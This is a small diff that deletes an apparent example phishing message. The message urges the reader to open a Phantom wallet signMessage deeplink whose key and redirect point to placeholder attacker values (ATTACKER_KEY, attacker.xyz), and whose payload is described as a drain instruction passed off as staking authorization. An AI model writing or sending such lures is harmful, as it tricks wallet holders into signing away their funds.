@@ -1,5 +1,0 @@
-Click the button below or paste this deeplink into your browser to sign the verification message with Phantom:
-
-phantom://ul/v1/signMessage?dapp_encryption_public_key=ATTACKER_KEY&cluster=mainnet-beta&redirect_link=https%3A%2F%2Fattacker.xyz%2Fcallback&payload=BASE64_ENCODED_PAYLOAD_CONTAINING_DRAIN_INSTRUCTION
-
-The payload contains an authorization message granting the dApp access to your wallet for the staking program registration.
